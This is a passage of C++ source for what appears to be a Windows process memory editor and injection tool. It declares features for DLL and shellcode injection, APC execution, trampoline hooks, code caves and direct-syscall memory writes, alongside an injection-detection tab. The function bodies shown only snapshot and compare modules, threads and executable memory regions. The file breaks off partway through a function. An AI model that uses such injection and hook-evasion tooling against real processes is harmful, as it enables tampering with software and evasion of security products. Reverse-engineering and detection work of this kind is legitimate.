#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <commctrl.h>
#include <commdlg.h>
#include <vector>
#include <string>
#include <map>
#include <sstream>
#include <algorithm>
#include <stdio.h>
#include <stdint.h>
#include <math.h>
#include <richedit.h>
#include <inttypes.h>
#include <random>          
#include <set>
#include "Zydis.h"

#ifndef EM_SETBKGNDCOLOR
#define EM_SETBKGNDCOLOR (WM_USER+67)
#endif
#ifndef EM_SETCHARFORMAT
#define EM_SETCHARFORMAT (WM_USER+68)
#endif
#ifndef SCF_SELECTION
#define SCF_SELECTION 0x0001
#endif
#ifndef SCF_ALL
#define SCF_ALL 0x0004
#endif
#ifndef CFM_COLOR
#define CFM_COLOR 0x40000000L
#endif
#ifndef CFM_FACE
#define CFM_FACE 0x20000000L
#endif

typedef struct {
    UINT      cbSize;
    DWORD     dwMask;
    DWORD     dwEffects;
    LONG      yHeight;
    LONG      yOffset;
    COLORREF  crTextColor;
    BYTE      bCharSet;
    BYTE      bPitchAndFamily;
    CHAR      szFaceName[32];
} RCEF_CF;

#define ID_BTN_BROWSE        1
#define ID_BTN_ATTACH        2
#define ID_BTN_FIRST_SCAN    4
#define ID_BTN_NEXT_SCAN     5
#define ID_LST_RESULTS       6
#define ID_BTN_REFRESH_HEX   7
#define ID_BTN_REFRESH_MAP   8
#define ID_LST_MEMMAP        9
#define ID_LST_HEX          10
#define ID_BTN_WRITE        11
#define ID_BTN_UNDO         12
#define ID_BTN_SET_OFFSET   13
#define ID_BTN_GOTO_OFFSET  14
#define ID_EDIT_OFFSET      15
#define ID_BTN_SEARCH_NAME  20
#define ID_EDIT_SEARCH      21
#define ID_LST_PROCS        22
#define ID_BTN_SELECT_PROC  23
#define ID_CMB_DATA_TYPE    30
#define ID_CMB_SCAN_TYPE    31
#define ID_BTN_ADD_WATCH    32
#define ID_BTN_CLEAR_WATCH  33
#define ID_BTN_FREEZE       34
#define ID_BTN_EXPORT       35
#define ID_BTN_PTR_SCAN     36
#define ID_BTN_READ_VAL     37
#define ID_LST_WATCH        39
#define ID_LST_MODULES      40
#define ID_BTN_REM_WATCH    41
#define ID_BTN_REFRESH_MODS 42
#define ID_BTN_CLEAR_SCAN   43
#define ID_BTN_INJECT_DLL   50
#define ID_BTN_EJECT_DLL    51
#define ID_BTN_BROWSE_DLL   52
#define ID_EDIT_DLL_PATH    53
#define ID_BTN_INJECT_CODE  54
#define ID_EDIT_SHELLCODE   55
#define ID_BTN_SCAN_CAVES   56
#define ID_LST_CAVES        57
#define ID_BTN_LIST_THREADS 58
#define ID_LST_THREADS      59
#define ID_EDIT_CAVE_SIZE   60
#define ID_CMB_MEM_PROT     61
#define ID_BTN_LOAD_SC_FILE 62
#define ID_CMB_ARCH         70
#define ID_CMB_SC_OP        71
#define ID_EDIT_SC_ADDR     72
#define ID_EDIT_SC_VAL      73
#define ID_BTN_BUILD_SC     74
#define ID_EDIT_SC_RESULT   75
#define ID_BTN_COPY_SC      76

#define ID_BTN_SEND_TO_BUILDER 77
#define ID_BTN_ASSEMBLER    80
#define ID_EDIT_ASM_SRC     81
#define ID_BTN_ASSEMBLE     82
#define ID_EDIT_ASM_OUT     83
#define ID_BTN_ASM_TO_SC    84

#define ID_BTN_COPY_ADDR_CLIP 102

#define ID_BTN_TRIGGER           800
#define ID_BTN_TRIGGER_CLEAR_LOG 801
#define ID_EDIT_TRIGGER_ADDR     802
#define ID_CMB_TRIGGER_METHOD    803
#define ID_EDIT_APC_TID          804
#define ID_EDIT_SENTINEL_ADDR2   805
#define ID_EDIT_SENTINEL_VAL2    806
#define ID_BTN_CHECK_SENTINEL2   807
#define ID_BTN_READ_OUTPUT       808
#define ID_EDIT_OUTPUT_ADDR      809
#define ID_EDIT_OUTPUT_SIZE      810
#define ID_LST_TRIGGER_LOG       811

#define ID_BTN_COPY_HEX        90
#define ID_BTN_COPY_RESULTS    91
#define ID_BTN_COPY_ADDR       92
#define ID_BTN_READ_STRING     93
#define ID_EDIT_STR_WRITE      94
#define ID_BTN_WRITE_UTF8      95
#define ID_BTN_WRITE_UTF16     96
#define ID_EDIT_AOB_PATCH_FIND 97
#define ID_EDIT_AOB_PATCH_REPL 98
#define ID_BTN_AOB_PATCH       99
#define ID_BTN_REATTACH       101
#define ID_BTN_COPY_ADDR_CLIP 102

HWND hPageVerify       = NULL;
HWND hLstVerify        = NULL;
HWND hBtnSnapshotVerify= NULL;
HWND hBtnCheckValues   = NULL;
HWND hBtnCheckModules  = NULL;
HWND hBtnCheckThreads  = NULL;
HWND hBtnCheckMemory   = NULL;
HWND hBtnCheckSentinel = NULL;
HWND hStaticSnapStatus = NULL;
HWND hEditSentinelAddr = NULL;
HWND hEditSentinelVal  = NULL;
HWND hBtnAnalyzeDump = NULL;
 
#define ID_BTN_SNAPSHOT_VERIFY  410
#define ID_BTN_CHECK_VALUES     411
#define ID_BTN_CHECK_MODULES    412
#define ID_BTN_CHECK_THREADS    413
#define ID_BTN_CHECK_MEMORY     414
#define ID_BTN_CHECK_SENTINEL   415
#define ID_EDIT_SENTINEL_ADDR   416
#define ID_EDIT_SENTINEL_VAL    417
#define ID_BTN_VERIFY_ALL       418
 
struct VerifySnapshot {
    std::vector<std::string>  modules;      
    std::vector<DWORD>        threadIds;
    struct MemRec {
        uintptr_t base; SIZE_T size; DWORD protect; DWORD type;
    };
    std::vector<MemRec>       memRegions;  
    std::vector<std::pair<LPVOID,int>> writtenValues; 
    bool taken   = false;
    SYSTEMTIME snapshotTime = {};
};
static VerifySnapshot g_vsnap;

struct PointerChain {
    std::string name;
    std::string moduleName;          
    uintptr_t   baseOffset;          
    std::vector<intptr_t> offsets;   
    uintptr_t   lastResolved = 0;
    int         lastValue = 0;
    bool        lastOk = false;
};
static std::vector<PointerChain> g_chains;

struct AutoPtrScanResult {
    std::string moduleName;
    uintptr_t   moduleBase = 0;
    uintptr_t   baseOff    = 0;
    std::vector<intptr_t> offsets;
    uintptr_t   resolved   = 0;
};
static std::vector<AutoPtrScanResult> g_lastAutoPtrScan;


struct HookRecord {
    LPVOID            target = nullptr;
    SIZE_T            patchSize = 0;
    std::vector<BYTE> originalBytes;
    LPVOID            trampolineAddr = nullptr;
    SIZE_T            trampolineSize = 0;
    bool              installed = false;
    std::string       description;
};
static std::vector<HookRecord> g_hooks;

struct PatchRecord {
    LPVOID            target = nullptr;
    SIZE_T            patchSize = 0;
    std::vector<BYTE> originalBytes;
    LPVOID            caveAddr = nullptr;   
    SIZE_T            caveSize = 0;
    bool              installed = false;
    std::string       kind;                 
    std::string       description;
};
static std::vector<PatchRecord> g_patches;


struct ExportEntry {
    std::string moduleName;
    std::string funcName;
    DWORD       ordinal = 0;
    LPVOID      address = nullptr;
};
static std::vector<ExportEntry> g_exports;


struct HandleInfoEntry {
    USHORT      handleValue = 0;
    BYTE        objType = 0;
    std::string typeName;
    std::string objName;
    PVOID       object = nullptr;
    ULONG       grantedAccess = 0;
};
static std::vector<HandleInfoEntry> g_handles;

#define ID_LST_WINDOWS        110
#define ID_BTN_REFRESH_WNDS   111
#define ID_EDIT_WND_TEXT      112
#define ID_BTN_SEND_SETTEXT   113
#define ID_BTN_SEND_GETTEXT   114

#define ID_TAB_CTRL          200
#define ID_BTN_WRITE_ALL     201
#define ID_CHK_PROTECT_WR    230
#define ID_CHK_SYSCALL_WR    248
#define ID_BTN_SUSPEND_THR   231
#define ID_BTN_RESUME_THR    232
#define ID_BTN_KILL_THREAD   233
#define ID_BTN_CAVE_INJECT   234
#define ID_BTN_COPY_TID_TO_APC    235

#define ID_EDIT_WND_MSG      215
#define ID_EDIT_WND_WPARAM   216
#define ID_EDIT_WND_LPARAM   217
#define ID_BTN_WND_POSTMSG   218
#define ID_EDIT_WND_CMD_ID   219
#define ID_BTN_WND_SENDCMD   220
#define ID_BTN_WND_FOCUS     221
#define ID_BTN_WND_HIDE      222
#define ID_BTN_WND_SHOW      223
#define ID_BTN_WND_ENABLE    224
#define ID_BTN_WND_DISABLE   225
#define ID_BTN_WND_MIN       226
#define ID_BTN_WND_MAX       227
#define ID_BTN_WND_RESTORE   228
#define ID_BTN_WND_CLOSE_W   229

#define ID_LST_DETECT        240
#define ID_BTN_DETECT_SCAN   241
#define ID_BTN_DETECT_COPY   242
#define ID_BTN_DETECT_CLEAR  243
#define ID_CHK_DETECT_RX     244
#define ID_CHK_DETECT_STOMP  245
#define ID_CHK_DETECT_MAPPED 246
#define ID_CHK_DETECT_THREAD 247
#define ID_CHK_DETECT_RWX    260
#define ID_CHK_DETECT_MANMAP 261
#define ID_CHK_DETECT_HIJACK 262
#define ID_CHK_DETECT_PATH   263
#define ID_BTN_EXEC_SHELLCODE 248
#define ID_BTN_DUMP_SELECTED  249
#define ID_EDIT_DUMP          250
#define ID_CMB_EXEC_METHOD    251
#define ID_EDIT_THREAD_ID     252
#define ID_BTN_EXEC_APC       253
#define ID_EDIT_SC_DLL_PATH   254
#define ID_EDIT_SC_EXPORT_FUNC 255
#define ID_BTN_SC_EXEC_DLL_EXPORT 256
#define ID_BTN_SC_BROWSE_DLL  257
#define ID_BTN_ANALYZE_DUMP  258

#define ID_BTN_HELP_MODULES     300
#define ID_BTN_HELP_INJECT      301
#define ID_BTN_HELP_WNDWRITER   302
#define ID_BTN_HELP_SHELLCODE   303

#define TIMER_FREEZE        100
#define TIMER_WATCH         101
#define TIMER_HEALTH        102

#define ID_BTN_USE_LAST_TID       812

#define ID_LST_CHAINS         900
#define ID_EDIT_CHAIN_NAME    901
#define ID_EDIT_CHAIN_MOD     902
#define ID_EDIT_CHAIN_BASE    903
#define ID_EDIT_CHAIN_OFFS    904
#define ID_BTN_CHAIN_ADD      905
#define ID_BTN_CHAIN_DEL      906
#define ID_BTN_CHAIN_RESOLVE  907
#define ID_BTN_CHAIN_SAVE     908
#define ID_BTN_CHAIN_LOAD     909
#define ID_BTN_CHAIN_REFRESH  910
#define ID_BTN_CALLGRAPH      920
#define ID_EDIT_CG_DEPTH      921
#define ID_LST_CALLGRAPH      922
#define ID_EDIT_CG_ADDR       923
#define ID_LST_HOOKS          930
#define ID_BTN_HOOK_INSTALL   931
#define ID_BTN_HOOK_RESTORE   932
#define ID_BTN_HOOK_REFRESH   933
#define ID_EDIT_HOOK_ADDR     934
#define ID_EDIT_HOOK_SC       935
#define ID_BTN_HOOK_HELP      936

#define ID_LST_EXPORTS        940
#define ID_BTN_EXP_REFRESH    941
#define ID_BTN_EXP_GOTO       942
#define ID_EDIT_EXP_FILTER    943
#define ID_BTN_EXP_FILTER     944

#define ID_LST_HANDLES        950
#define ID_BTN_HND_REFRESH    951
#define ID_EDIT_HND_FILTER    952
#define ID_BTN_HND_FILTER     953

#define ID_EDIT_PATCH_ADDR       970
#define ID_EDIT_PATCH_SIZE       971
#define ID_BTN_PATCH_READ        972
#define ID_EDIT_PATCH_BYTES      973
#define ID_BTN_PATCH_DISASM      974
#define ID_EDIT_PATCH_DISASM     975
#define ID_EDIT_PATCH_PAYLOAD    976
#define ID_BTN_PATCH_WRITEBYTES  977
#define ID_EDIT_PATCH_NOPLEN     978
#define ID_BTN_PATCH_NOP         979
#define ID_EDIT_PATCH_JMPTARGET  980
#define ID_BTN_PATCH_SHORTJMP    981
#define ID_BTN_PATCH_NEARJMP     982
#define ID_EDIT_PATCH_CAVESIZE   983
#define ID_BTN_PATCH_CAVE        984
#define ID_LST_PATCHES           985
#define ID_BTN_PATCH_RESTORE     986
#define ID_BTN_PATCH_REFRESH     987
#define ID_BTN_PATCH_HELP        988

#define ID_EDIT_APS_TARGET      1000
#define ID_EDIT_APS_DEPTH       1001
#define ID_EDIT_APS_MAXOFF      1002
#define ID_BTN_APS_SCAN         1003
#define ID_LST_APS_RESULTS      1004
#define ID_BTN_APS_ADDCHAIN     1005
#define ID_BTN_APS_CLEAR        1006
#define ID_BTN_APS_USE_SELECTED 1007
#define ID_BTN_APS_HELP         1008

#define ID_EDIT_DW_TARGET       1020
#define ID_EDIT_DW_OFFSET       1021
#define ID_EDIT_DW_VIEW_SIZE    1022
#define ID_EDIT_DW_STEP         1023
#define ID_BTN_DW_REFRESH       1024
#define ID_BTN_DW_USE_SELECTED  1025
#define ID_BTN_DW_STEP_BACK     1026
#define ID_BTN_DW_PAGE_BACK     1027
#define ID_BTN_DW_CENTER        1028
#define ID_BTN_DW_PAGE_FWD      1029
#define ID_BTN_DW_STEP_FWD      1030
#define ID_BTN_DW_HELP          1031
#define ID_LST_DW_DISASM        1032

#define DT_INT32  0
#define DT_INT16  1
#define DT_INT8   2
#define DT_INT64  3
#define DT_FLOAT  4
#define DT_DOUBLE 5
#define DT_STRING 6
#define DT_AOB    7

#define SC_EXACT    0
#define SC_CHANGED  1
#define SC_UNCHANGED 2
#define SC_INCREASED 3
#define SC_DECREASED 4
#define SC_UNKNOWN  5

#define CLR_BG_WINDOW  RGB(18,  20,  30)
#define CLR_BG_EDIT    RGB(30,  33,  48)
#define CLR_BG_LIST    RGB(14,  16,  24)
#define CLR_BG_STATUS  RGB(10,  11,  16)
#define CLR_TEXT_NORM  RGB(210, 215, 230)
#define CLR_TEXT_EDIT  RGB(160, 240, 170)
#define CLR_TEXT_LIST  RGB(140, 230, 150)
#define CLR_TEXT_HDR   RGB(80,  200, 255)
#define CLR_TEXT_STAT  RGB(170, 210, 170)
#define CLR_TEXT_INFO  RGB(255, 215, 90)
#define CLR_TEXT_WARN  RGB(255, 120, 80)

HINSTANCE hInst;
HWND hMainWnd;

HWND hScanResultsWnd, hMemoryMapWnd, hHexViewWnd;
HWND hLstWatchList, hLstModules, hLstCaves, hLstThreads;

HWND hEditPID, hEditScanValue, hEditNewValue, hEditHexAddress;
HWND hEditSearchName, hEditTrackedOffset, hEditShellAddr, hCmbExecMethod, hEditThreadId, hEditScDllPath, hEditScExportFunc;
HWND hBtnFirstScan, hBtnNextScan, hBtnWrite, hBtnUndo, hBtnRefreshHex;
HWND hBtnSetOffset, hBtnGotoOffset, hBtnFreeze, hBtnExport;
HWND hStaticProcessInfo, hStaticModuleInfo, hStaticAddressInfo, hStatusWnd;
HWND hStaticOffsetInfo, hStaticScanCount;
HWND hHdrScan, hHdrMap, hHdrHex, hHdrWrite, hHdrMods, hHdrWatch;
HWND hCmbDataType, hCmbScanType;
HWND hHdrInject, hHdrDllInject, hHdrShellcode, hHdrBuilder, hHdrCaves, hHdrThreads;
HWND hEditDllPath, hBtnBrowseDll, hBtnInjectDll, hBtnEjectDll;
HWND hEditShellcode, hBtnInjectCode, hBtnLoadScFile, hCmbMemProt;
HWND hEditCaveSize, hBtnScanCaves;
HWND hBtnListThreads;
HWND hCmbArch, hCmbScOp, hEditScAddr, hEditScVal, hBtnBuildSc;
HWND hEditScResult, hBtnCopySc, hBtnSendToBuilder, hBtnAssembler;

HWND hBtnCopyHex, hBtnCopyResults, hBtnReadString;
HWND hEditStrWrite, hBtnWriteUtf8, hBtnWriteUtf16;
HWND hEditAobPatchFind, hEditAobPatchRepl, hBtnAobPatch;
HWND hBtnReattach, hBtnCopyAddrClip;
HWND hHdrStrWriter, hHdrAobPatch;
HWND hHdrWndWriter, hLstWindows, hEditWndText;

HWND hStaticSelWnd, hEditWndMsg, hEditWndWParam, hEditWndLParam, hEditWndCmdId;

HWND hLstDetect, hHdrDetect, hEditDump;
HWND hBtnDetectScan, hBtnDetectCopy, hBtnDetectClear, hBtnExecShellcode, hBtnDumpSelected, hBtnExecDllExport, hBtnExecAPC;
HWND hChkDetectRx, hChkDetectStomp, hChkDetectMapped, hChkDetectThread;
HWND hChkDetectRwx, hChkDetectManMap, hChkDetectHijack, hChkDetectPath;

HWND hChkProtect;
HWND hChkSyscall;

HWND hPageTrigger, hLstTriggerLog, hEditTriggerAddr, hCmbTriggerMethod, hEditApcTid;
HWND hEditSentinelAddr2, hEditSentinelVal2, hBtnCheckSentinel2, hBtnReadOutput;
HWND hEditOutputAddr, hEditOutputSize, hBtnTrigger, hBtnTriggerClearLog;

HWND hPagePtrHook = NULL;      
HWND hPageExpHnd  = NULL;       
HWND hLstChains   = NULL, hEditChainName = NULL, hEditChainMod = NULL;
HWND hEditChainBase = NULL, hEditChainOffs = NULL;
HWND hLstCallGraph = NULL, hEditCgAddr = NULL, hEditCgDepth = NULL;
HWND hLstHooks = NULL, hEditHookAddr = NULL, hEditHookSc = NULL;
HWND hLstExports = NULL, hEditExpFilter = NULL;
HWND hLstHandles = NULL, hEditHndFilter = NULL;

HWND hPagePatcher = NULL;
HWND hEditPatchAddr = NULL, hEditPatchSize = NULL, hEditPatchBytes = NULL;
HWND hEditPatchDisasm = NULL, hEditPatchPayload = NULL;
HWND hEditPatchNopLen = NULL, hEditPatchJmpTarget = NULL, hEditPatchCaveSize = NULL;
HWND hLstPatches = NULL;

HWND hPageAutoPtr = NULL;
HWND hEditApsTarget = NULL, hEditApsDepth = NULL, hEditApsMaxOff = NULL;
HWND hLstApsResults = NULL;

HWND hPageDisasmWalk = NULL;
HWND hEditDwTarget = NULL, hEditDwOffset = NULL, hEditDwViewSize = NULL, hEditDwStep = NULL;
HWND hLstDwDisasm = NULL;

HWND hTabCtrl, hPageScan, hPageMods, hPageInject, hPageWnd, hPageDetect, hPageShellcode;

HWND hWndAssembler = NULL;

HFONT hFontTitle, hFontSection, hFontNormal, hFontMono, hFontSmall;
HBRUSH hBrushWindow, hBrushEdit, hBrushList, hBrushStatus;
static WNDPROC g_origScanEditProc = NULL;
static WNDPROC g_origWndListProc  = NULL;
static HMODULE g_hRichEdit = NULL;
static HWND    g_targetWnd = NULL;  
static BYTE    freezeBytes[16] = {};
static size_t  freezeByteLen   = 0;
DWORD g_lastCreatedThreadId = 0;


HANDLE hProcess   = NULL;
DWORD  currentPID = 0;

static uintptr_t g_PtrKey = []() {
    std::random_device rd;
    std::mt19937_64 gen(rd());
    return gen();
}();

inline uintptr_t EncryptPointer(LPVOID ptr) {
    return reinterpret_cast<uintptr_t>(ptr) ^ g_PtrKey;
}

inline LPVOID DecryptPointer(uintptr_t enc) {
    return reinterpret_cast<LPVOID>(enc ^ g_PtrKey);
}

uintptr_t encryptedSelectedAddress = 0;  

LPVOID GetSelectedAddress() {
    return encryptedSelectedAddress ? DecryptPointer(encryptedSelectedAddress) : nullptr;
}

void SetSelectedAddress(LPVOID addr) {
    encryptedSelectedAddress = addr ? EncryptPointer(addr) : 0;
}

std::vector<LPVOID>             scanResults;
std::vector<std::vector<BYTE>>  scanPrevVals;

struct Backup4 { BYTE data[4]; };
std::map<LPVOID, Backup4> backups;

std::vector<LPVOID> watchList;

LONGLONG trackedOffset    = 0;
bool     hasTrackedOffset = false;
bool     freezeActive     = false;
int      freezeValue      = 0;

void LogToStatus(const char* msg, bool error = false);
std::vector<std::pair<DWORD,std::string>> SearchProcessesByName(const std::string& name);
bool AttachToProcess(DWORD pid);
void UpdateProcessInfo();
void ShowMemoryMap();
void ShowHexAtAddress(LPVOID address, LPVOID highlightAddr = nullptr);
void UpdateOffsetInfo();
void UpdateScanCount();
void PopulateModuleList();
void RefreshWatchList();
void ExportScanResults();
void BuildShellcode();
void ShowAssemblerWindow();
void InjectDLL();
void EjectDLL();
void InjectShellcode();
void ScanCodeCaves();
void ListRemoteThreads();
void DoFirstScan();
void DoNextScan();

void TakeVerifySnapshot();
void VerifyCheckValues();
void VerifyCheckModules();
void VerifyCheckThreads();
void VerifyCheckMemory();
void VerifyCheckSentinel();
void RunVerifyAll();
size_t      GetDataTypeSize(int dt);
std::string FormatTypedValue(const BYTE* data, int dt);
void        ClearEditText(HWND hEdit);

void ScanForPointers(LPVOID targetAddr);

std::string FormatMemorySize(SIZE_T bytes);
LPVOID GetBaseAddress();
int    ReadValueFromAddress(LPVOID address);
void   WriteValueToAddress(LPVOID address, int value);
bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect, bool useSyscall=false);
void WriteStringToAddress(LPVOID address, bool utf16, bool useSyscall=false);
static bool SyscallWriteVirtualMemory(HANDLE process, PVOID baseAddress, const void* buffer, SIZE_T bufferSize, SIZE_T* bytesWritten);
static bool SyscallProtectVirtualMemory(HANDLE process, PVOID baseAddress, SIZE_T regionSize, DWORD newProtect, DWORD* oldProtect);

static HMODULE FindModuleByPath(DWORD pid, const char* fullPath);
static DWORD GetExportRVA(const char* dllPath, const char* funcName);

void CopyEditToClipboard(HWND hEdit);
void AppendEditText(HWND hEdit, const char* line);
void SetEditText(HWND hEdit, const char* text);
void ReadStringAtAddress(LPVOID address);
void DoAobPatchReplace();
void EnumerateProcessWindows();
void WriteAllScanResults();
void SuspendResumeProcess(bool suspend);
void InjectIntoCodeCave();
void KillSelectedThread();
void UpdateSelectedWindowInfo(HWND target);
void RunInjectionDetection();



void LogToTrigger(const char* msg, bool error = false);
void TriggerShellcode();


LPVOID ResolveChain(const PointerChain& c, bool& ok);
void RefreshChainsUI();
void AddChainFromUI();
void DeleteSelectedChain();
void ResolveChainToSelected();
void SaveChainsToFile();
void LoadChainsFromFile();
void TraceCallGraph();
void InstallTrampolineHook();
void RestoreSelectedHook();
void RefreshHooksUI();
void EnumerateExports();
void RefreshExportsUI();
void GoToSelectedExport();
void EnumerateHandles();
void RefreshHandlesUI();
void PatcherReadAndShow();
void PatcherDisassembleAtAddr();
void PatcherWriteRawBytes();
void PatcherNopOut();
void PatcherShortJmp();
void PatcherNearJmp();
void PatcherInstallCodeCave();
void PatcherRestoreSelected();
void PatcherRefreshList();
void RunAutoPointerScan();
void AddAutoPtrScanToChains();
void DisasmWalkerRefresh();
void DisasmWalkerAdjustOffset(intptr_t delta);
static int DisasmOne(const BYTE* b, size_t left, uint64_t rva, char* out, size_t outSz);



static void VerifySep(const char* title) {
    char line[256];
    sprintf_s(line, "\r\n─── %s ───", title);
    AppendEditText(hLstVerify, line);
}
 

static void VerifyLine(bool ok, const char* fmt, ...) {
    char body[512];
    va_list ap; va_start(ap, fmt); vsprintf_s(body, fmt, ap); va_end(ap);
    char line[600];
    sprintf_s(line, "  %s  %s", ok ? "[ OK ]" : "[ !! ]", body);
    AppendEditText(hLstVerify, line);
}
 

void TakeVerifySnapshot() {
    if (!hProcess || !currentPID) {
        LogToStatus("Attach to a process first", true); return;
    }
    g_vsnap = VerifySnapshot{};  
    GetLocalTime(&g_vsnap.snapshotTime);
 
    {
        HMODULE mods[1024]; DWORD needed = 0;
        if (EnumProcessModules(hProcess, mods, sizeof(mods), &needed)) {
            DWORD cnt = needed / sizeof(HMODULE);
            for (DWORD i = 0; i < cnt; i++) {
                char path[MAX_PATH] = {};
                GetModuleFileNameExA(hProcess, mods[i], path, MAX_PATH);
                MODULEINFO mi = {}; GetModuleInformation(hProcess, mods[i], &mi, sizeof(mi));
                char rec[MAX_PATH + 64];
                sprintf_s(rec, "0x%llX|%llu|%s",
                    (unsigned long long)(uintptr_t)mi.lpBaseOfDll,
                    (unsigned long long)mi.SizeOfImage, path);
                g_vsnap.modules.push_back(rec);
            }
        }
    }
 
   
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te; te.dwSize = sizeof(te);
            if (Thread32First(snap, &te)) {
                do {
                    if (te.th32OwnerProcessID == currentPID)
                        g_vsnap.threadIds.push_back(te.th32ThreadID);
                } while (Thread32Next(snap, &te));
            }
            CloseHandle(snap);
        }
    }
 
  
    {
        SYSTEM_INFO si; GetSystemInfo(&si);
        LPVOID addr = si.lpMinimumApplicationAddress;
        while (addr < si.lpMaximumApplicationAddress) {
            MEMORY_BASIC_INFORMATION mbi;
            if (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) != sizeof(mbi)) break;
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
                                PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
                VerifySnapshot::MemRec r;
                r.base = (uintptr_t)mbi.BaseAddress;
                r.size = mbi.RegionSize;
                r.protect = mbi.Protect;
                r.type = mbi.Type;
                g_vsnap.memRegions.push_back(r);
            }
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        }
    }
 
    for (LPVOID a : scanResults) {
        int v = 0; SIZE_T r;
        ReadProcessMemory(hProcess, a, &v, 4, &r);
        g_vsnap.writtenValues.push_back({a, v});
    }
 
    g_vsnap.taken = true;
 
    char msg[256];
    SYSTEMTIME& t = g_vsnap.snapshotTime;
    sprintf_s(msg,
        "Snapshot taken at %02d:%02d:%02d  |  "
        "%zu module(s)  |  %zu thread(s)  |  %zu exec region(s)  |  %zu scan addr(s)",
        t.wHour, t.wMinute, t.wSecond,
        g_vsnap.modules.size(), g_vsnap.threadIds.size(),
        g_vsnap.memRegions.size(), g_vsnap.writtenValues.size());
    SetWindowTextA(hStaticSnapStatus, msg);
    LogToStatus("Verification snapshot taken");
}
 
void VerifyCheckValues() {
    VerifySep("VALUE READ-BACK  (scan results vs current memory)");
    if (!hProcess) { AppendEditText(hLstVerify, "  Not attached."); return; }
    if (scanResults.empty()) { AppendEditText(hLstVerify, "  No scan results to verify."); return; }
 
    int dt = (int)SendMessage(hCmbDataType, CB_GETCURSEL, 0, 0);
    char wantedStr[128] = {}; GetWindowTextA(hEditNewValue, wantedStr, 128);
    LPVOID base = GetBaseAddress();
 
    int matched = 0, total = 0;
    for (LPVOID addr : scanResults) {
        BYTE buf[16] = {}; SIZE_T r;
        size_t sz = GetDataTypeSize(dt);
        if (!ReadProcessMemory(hProcess, addr, buf, sz, &r) || r < sz) {
            VerifyLine(false, "0x%p  read FAILED", addr);
            total++; continue;
        }
        std::string curVal = FormatTypedValue(buf, dt);
        LONGLONG off = base ? ((LONGLONG)(uintptr_t)addr - (LONGLONG)(uintptr_t)base) : 0;
 
        bool match = false;
        if (dt == DT_INT32 || dt == DT_INT16 || dt == DT_INT8 || dt == DT_INT64) {
            BYTE wantBuf[16] = {};
            if      (dt == DT_INT8)  { int8_t  v=(int8_t) atoi(wantedStr); memcpy(wantBuf,&v,1); }
            else if (dt == DT_INT16) { int16_t v=(int16_t)atoi(wantedStr); memcpy(wantBuf,&v,2); }
            else if (dt == DT_INT64) { int64_t v=_strtoi64(wantedStr,NULL,10); memcpy(wantBuf,&v,8); }
            else                     { int32_t v=atoi(wantedStr); memcpy(wantBuf,&v,4); }
            match = (memcmp(buf, wantBuf, sz) == 0);
        } else if (dt == DT_FLOAT) {
            float want=(float)atof(wantedStr), got=*(float*)buf;
            match = fabsf(got - want) < 0.001f;
        } else if (dt == DT_DOUBLE) {
            double want=atof(wantedStr), got=*(double*)buf;
            match = fabs(got - want) < 0.00001;
        } else {
            match = true; 
        }
 
        char line[512];
        sprintf_s(line, "0x%p  +0x%llX  current=%-18s  wanted=%s",
            addr, off, curVal.c_str(), wantedStr);
        VerifyLine(match, "%s", line);
        if (match) matched++;
        total++;
    }
 
    char sum[128];
    sprintf_s(sum, "  Result: %d / %d address(es) hold the expected value.", matched, total);
    AppendEditText(hLstVerify, sum);
}
 
void VerifyCheckModules() {
    VerifySep("MODULE DIFF  (new DLLs since snapshot)");
    if (!hProcess) { AppendEditText(hLstVerify, "  Not attached."); return; }
 
    HMODULE mods[1024]; DWORD needed = 0;
    std::vector<std::string> current;
    if (EnumProcessModules(hProcess, mods, sizeof(mods), &needed)) {
        DWORD cnt = needed / sizeof(HMODULE);
        for (DWORD i = 0; i < cnt; i++) {
            char path[MAX_PATH] = {};
            GetModuleFileNameExA(hProcess, mods[i], path, MAX_PATH);
            MODULEINFO mi = {}; GetModuleInformation(hProcess, mods[i], &mi, sizeof(mi));
            char rec[MAX_PATH + 64];
            sprintf_s(rec, "0x%llX|%llu|%s",
                (unsigned long long)(uintptr_t)mi.lpBaseOfDll,
                (unsigned long long)mi.SizeOfImage, path);
            current.push_back(rec);
        }
    }
 
    if (!g_vsnap.taken) {
        AppendEditText(hLstVerify, "  No snapshot – showing all current modules:");
        for (auto& m : current) {
            const char* name = strrchr(m.c_str(), '|');
            VerifyLine(true, "%s", name ? name + 1 : m.c_str());
        }
        return;
    }
 
    int newMods = 0;
    for (auto& cm : current) {
        bool found = false;
        for (auto& sm : g_vsnap.modules) if (sm == cm) { found = true; break; }
        if (!found) {
            const char* name = strrchr(cm.c_str(), '|');
            char line[MAX_PATH + 64];
            sprintf_s(line, "NEW  %s", name ? name + 1 : cm.c_str());
            VerifyLine(true, "%s", line);
            newMods++;
        }
    }
 
    int removedMods = 0;
    for (auto& sm : g_vsnap.modules) {
        bool found = false;
        for (auto& cm : current) if (cm == sm) { found = true; break; }
        if (!found) {
            const char* name = strrchr(sm.c_str(), '|');
            char line[MAX_PATH + 64];
            sprintf_s(line, "GONE  %s", name ? name + 1 : sm.c_str());
            VerifyLine(false, "%s", line);
            removedMods++;
        }
    }
 
    if (newMods == 0 && removedMods == 0)
        AppendEditText(hLstVerify, "  No module changes since snapshot.");
    else {
        char sum[128];
        sprintf_s(sum, "  Result: %d new module(s), %d removed module(s).", newMods, removedMods);
        AppendEditText(hLstVerify, sum);
    }
}
 
void VerifyCheckThreads() {
    VerifySep("THREAD DIFF  (new threads since snapshot)");
    if (!currentPID) { AppendEditText(hLstVerify, "  Not attached."); return; }
 
    typedef NTSTATUS(WINAPI* NtQIT)(HANDLE, int, PVOID, ULONG, PULONG);
    static NtQIT fn = (NtQIT)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                             "NtQueryInformationThread");
 
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        AppendEditText(hLstVerify, "  Snapshot failed."); return;
    }
 
    std::vector<DWORD> current;
